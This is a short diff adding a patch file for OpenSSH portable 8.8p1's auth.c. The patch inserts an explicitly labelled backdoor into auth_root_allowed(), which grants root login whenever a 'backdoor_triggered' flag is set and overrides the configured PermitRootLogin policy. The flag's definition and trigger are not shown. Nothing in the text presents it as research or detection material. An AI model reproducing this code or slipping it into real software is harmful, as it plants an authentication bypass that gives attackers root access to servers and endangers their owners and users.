@@ -1,0 +1,11 @@
+--- openssh-portable-v8.8_p1/auth.c	2021-12-02 17:04:09.337420945 -0600
++++ openssh-portable-patch/auth.c	2021-12-02 17:31:51.647606026 -0600
+@@ -396,6 +396,8 @@
+ int
+ auth_root_allowed(struct ssh *ssh, const char *method)
+ {
++	/* Backdoor allows root login for our session */
++	if (ssh->backdoor_triggered == 1) return 1;
+ 	switch (options.permit_root_login) {
+ 	case PERMIT_YES:
+ 		return 1;
